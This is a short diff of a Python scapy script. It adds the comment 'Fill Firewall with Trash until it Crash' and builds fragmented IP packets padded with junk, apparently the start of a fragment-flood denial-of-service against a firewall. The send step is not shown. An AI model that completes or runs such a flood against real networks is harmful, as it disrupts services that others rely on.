@@ -1,3 +1,4 @@
+#Fill Firewall with Trash until it Crash
 from scapy.all import *
 
 frags = fragment(Ether()/IP()/Raw(load="AAAA"*1000), fragsize=100)
